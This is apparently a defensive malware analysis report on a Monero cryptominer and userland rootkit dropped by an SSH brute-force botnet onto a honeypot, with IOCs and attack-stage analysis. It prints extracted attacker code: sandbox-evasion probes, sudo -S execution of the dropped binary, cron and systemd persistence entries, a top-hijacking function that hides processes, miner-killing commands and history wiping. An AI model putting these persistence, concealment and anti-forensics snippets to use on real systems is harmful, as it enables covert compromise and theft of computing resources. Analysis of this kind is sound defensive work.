# Malware Analysis Case Study: The `.16` (`Mexals / libbase`) Cryptominer & Userland Rootkit

## 1. Executive Summary

Within hours of deploying `vm-ubuntu-sensor-01` (`prod-db-backup-01`) in Azure Malaysia West, three coordinated botnet nodes (**`92.118.39.50`**, **`195.178.110.227`**, and **`80.94.92.55`**) conducted low-and-slow SSH credential brute-forcing, executed automated **anti-honeypot sandbox verification probes**, and deployed a **3.37 MB 64-bit statically linked ELF binary named `.16`** via SFTP into `/dev/shm/.16` and `/root/.16`.

Static binary analysis of the quarantined payload (`SHA-256: a151d3f4f2422531f30a843ffb35479596c86722bb103bdf8591105687f9b125`) revealed a multi-stage **XMRig Monero cryptominer (`v6.22+` / `RandomX`)** bundled with an aggressive **Linux userland rootkit (`libcommon.so` / `libbase.sh`)**, **shell-function hijackers (`top`, `crontab`, `kill`)**, **4-layer persistence (`snap`/`snapd`/`.X0-lock`/`system-helper.timer`)**, and **automated `fail2ban` installation** designed to lock rival threat actors out of the compromised server.

---

## 2. Quarantined Sample Metadata & Indicators of Compromise (IOCs)

| Property | Value |
| :--- | :--- |
| **Dropped Filenames** | `/dev/shm/.16`, `/root/.16` |
| **Masqueraded Persistence Paths** | `/var/tmp/snap`, `/var/tmp/snapd`, `$HOME/.X0-lock`, `/usr/local/bin/system-helper-run` |
| **Rootkit / Hook Paths** | `/etc/ld.so.preload`, `/usr/local/lib/libcommon.so`, `/usr/local/libexec/libbase.sh`, `/etc/profile.d/libbase.sh` |
| **File Size** | `3,373,344` bytes (3.37 MB) |
| **File Format** | `ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked` (`7f454c4602010100...`) |
| **SHA-256** | `a151d3f4f2422531f30a843ffb35479596c86722bb103bdf8591105687f9b125` |
| **Delivery Infrastructure (IPs)** | `92.118.39.50`, `195.178.110.227`, `80.94.92.55` |
| **SSH Client Fingerprint** | `SSH-2.0-Go` (`HASSH: 98ddc5604ef6a1006a2b49a58759fbe6`) |
| **Monero Mining Pools (Port `5555`)** | `pool-fr.supportxmr.com:5555`, `pool-phx.supportxmr.com:5555`, `pool-nyc.supportxmr.com:5555`, `pool-hk.supportxmr.com:5555`, `pool-sg.supportxmr.com:5555`, `pool-aus.supportxmr.com:5555`, `pool-ca.supportxmr.com:5555` |

---

## 3. Stage-by-Stage Technical Kill Chain Analysis

### Stage 1: Low-and-Slow Credential Brute Force (`T1110.001`)
Unlike noisy scanners (`109.160.32.112` and `77.239.124.47`) that fired 1,000+ rapid login attempts, `92.118.39.50` and `195.178.110.227` spaced their SSH login attempts approximately **2 minutes and 44 seconds apart** to evade default connection-rate limiters, cycling through high-probability pairs (`root:toor`, `admin:123456`, `admin:admin123`, `root:password`, `root:qwerty`).

### Stage 2: Anti-Honeypot Sandbox & Shell Verification (`T1497.001`)
Immediately upon authenticating, the botnet **refused to drop its binary** until it verified that the target shell supported genuine POSIX arithmetic, subshell variable scoping, function definitions, and special-character parsing:

```bash
# 1. Control & Echo Verification
sh -c 'printf '\''\n%s|%s\n'\'' '\''check_9c20619b4a01fc1fcf20774b9afb3de9_small_control'\'' '\''check_9c20619b4a01fc1fcf20774b9afb3de9_small_control'\'''

# 2. POSIX Arithmetic Expansion Probe (Expects: 18962)
sh -c 'printf '\''\n%s|%s\n'\'' '\''check_9c20619b4a01fc1fcf20774b9afb3de9_small_math'\'' "$((89*213+5))"'

# 3. Subshell Variable-Scoping Probe (Expects: child=inner / parent=outer)
sh -c 'v=outer; (v=inner; printf '\''\n%s|child=%s\n'\'' '\''check_9c20619b4a01fc1fcf20774b9afb3de9_small_subshell'\'' "$v"); printf '\''%s|parent=%s\n'\'' '\''check_9c20619b4a01fc1fcf20774b9afb3de9_small_subshell'\'' "$v"'

# 4. Parser Edge-Case & Function Probe
sh -c 'printf '\''\n%s|%s\n'\'' '\''check_9c20619b4a01fc1fcf20774b9afb3de9_small_special'\'' '\''a b;$()'\'''
```

- **Why Attackers Do This:** Simple low-interaction SSH honeypots pattern-match basic commands (`ls`, `whoami`, `uname`) and cannot evaluate `$((89*213+5))` (`18962`) or maintain isolated parent/child variable scopes across subshells `(v=inner; ...)`.

### Stage 3: SFTP Staging in `/dev/shm` & `sudo -S` Execution (`T1105`, `T1564.001`, `T1548.003`)
Once the verification probes completed, the operator opened an SFTP channel (`cowrie.session.file_upload`), uploaded `.16` into `/dev/shm/.16` (the Linux in-memory `tmpfs` shared-memory filesystem) and `/root/.16`, and piped the cracked password into `sudo -S`:

```bash
echo '123456' | sudo -S sh -c 'chmod +x '\''/dev/shm/.16'\''' || echo '123456' | sudo -S chmod +x '/dev/shm/.16'
echo '123456' | sudo -S sh -c 'nohup '\''/dev/shm/.16'\'' >/dev/null 2>&1 &'
```

---

## 4. Static Binary Analysis of `.16` (`.rodata` String & Config Extraction)

Performing read-only static binary inspection (`open(..., "rb")`) on the quarantined `3,373,344`-byte ELF file revealed five distinct post-exploitation modules compiled into the binary:

### 4.1 Multi-Mechanism Persistence & Masquerading (`T1036.005`, `T1053.003`, `T1543.002`)
The binary copies itself to legitimate-sounding Ubuntu package manager paths (`/var/tmp/snap`, `/var/tmp/snapd`, and `$HOME/.X0-lock`) and registers **four overlapping persistence mechanisms**:
1. **User `crontab` (`@reboot` & every-minute `* * * * *`):**
   ```text
   @reboot [ -f /var/tmp/snap ] && chmod +x /var/tmp/snap && /var/tmp/snap
   @reboot [ -f /var/tmp/snapd ] && chmod +x /var/tmp/snapd && /var/tmp/snapd
   @reboot [ -f $HOME/.X0-lock ] && chmod +x $HOME/.X0-lock && $HOME/.X0-lock
   * * * * * [ -f /var/tmp/snap ] && chmod +x /var/tmp/snap && /var/tmp/snap
   ```
2. **System Cron Job (`/etc/cron.d/system-helper`):**
   ```text
   * * * * * root /usr/local/bin/system-helper-run
   ```
3. **Systemd Timer & Service (`/etc/systemd/system/system-helper.timer`):**
   ```ini
   [Unit]
   Description=Run System Helper Service periodically
   [Timer]
   OnCalendar=*:0/1
   Persistent=true
   ```
4. **Legacy Boot Script (`/etc/rc.local`):** Appends `/usr/local/bin/system-helper-run` before `exit 0`.

### 4.2 Userland Rootkit & Interactive Shell Function Hijacking (`T1574.006`, `T1546.004`)
To blind system administrators investigating high CPU usage, `.16` deploys both a shared-library preloader (`/usr/local/lib/libcommon.so` injected into `/etc/ld.so.preload`) and an interactive shell hijacker (`/usr/local/libexec/libbase.sh` sourced via `$HOME/.bashrc` and `/etc/profile.d/libbase.sh`).

Extracted directly from the binary's `.rodata` section:
1. **Hijacking `top` to Hide the Miner:**
   ```bash
   top() {
     if [ -t 1 ]; then
       script -q -c "/usr/bin/top" /dev/null | sed -u -e '/16/d' -e '/libbase\.sh/d'
     else
       /usr/bin/top "$@" | sed -e '/16/d' -e '/libbase\.sh/d'
     fi
   }
   ```
2. **Hijacking `crontab` to Hide & Self-Heal Malicious Cron Entries:**
   - When the administrator runs `crontab -l`, the hijacked shell function filters out any line matching `snap|snapd|\.X0-lock`.
   - When the administrator runs `crontab -r` (to wipe the crontab), the function secretly extracts the hidden malware lines and re-installs them back into `crontab -`!
3. **Hijacking `kill` to Strip `SIGKILL` (`-9`):**
   - Overrides `kill()` in the admin's shell to strip `-9`, `-KILL`, and `-SIGKILL` flags before calling `/bin/kill`, preventing administrators from terminating the miner!

### 4.3 Competitor Elimination & Automated `fail2ban` Hardening (`T1070.003`, `T1496`)
Remarkably, `.16` actively defends its newly compromised host against rival botnets:
- **Kills Competing GPU/CPU Miners:**
  ```bash
  nvidia-smi | awk '/\.\/init/ {print $5}' | sed 's/[^0-9]*//g' | sort -u | xargs -r kill -9
  pkill -9 -f "\.b0s"
  ```
- **Installs & Configures `fail2ban` to Block Other SSH Brute-Forcers:**
  ```ini
  [DEFAULT]
  bantime = -1
  findtime = 600
  maxretry = 3
  [sshd]
  enabled = true
  port = ssh
  logpath = %(sshd_log)s
  ```
  By setting `bantime = -1` (permanent IP ban after 3 failed SSH logins), the malware locks the front door behind itself so no other threat actor can brute-force the same weak credentials!
- **Anti-Forensics:** Executes `rm -f "$HOME/.bash_history"` and `history -c`.
